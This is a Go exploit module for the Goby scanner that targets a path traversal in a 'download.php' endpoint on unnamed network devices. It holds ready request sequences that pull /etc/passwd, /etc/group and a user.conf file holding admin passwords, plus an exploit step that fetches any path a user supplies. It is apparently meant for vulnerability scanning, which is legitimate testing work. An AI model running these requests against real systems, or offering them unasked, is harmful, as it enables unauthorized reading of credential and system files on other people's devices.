package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Many network devices have arbitrary file downloads",
  "Description": "The download.php page contains any file downloads",
  "Product": "Many network devices",
  "Homepage": "https://gobies.org/",
  "DisclosureDate": "2021-07-15",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"persons\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">Arbitrary file download or read vulnerability is mainly because when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter and does not verify the legitimacy of the file path, resulting in the attacker can jump through the directory (..</span><span style=\"font-size: 14px;\">\\ or..</span><span style=\"font-size: 14px;\">/) way to download or read a file outside the original specified path.</span><span style=\"font-size: 14px;\">The attacker can finally download or read any file on the system through the vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in the sensitive information leakage of the system.</span><br></p>",
  "Recommandation": "<p>Limit../ symbol, file download to determine the input path, the best way is that the file should be in the database for one-to-one correspondence, avoid by entering the absolute path to get files<br></p>",
  "References": [
    "https://mp.weixin.qq.com/s/utv9ZX4HhDmEtbhBlhFBBQ"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "createSelect",
      "value": "../../../../../etc/passwd,../../user.conf",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/download.php?class=vpn&toolname=../../../../../etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/download.php?class=vpn&toolname=../../../../../etc/group",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/download.php?class=vpn&toolname=../../user.conf",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "admin",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "password",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/download.php?class=vpn&toolname={{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "file downloads"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "Many network devices"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
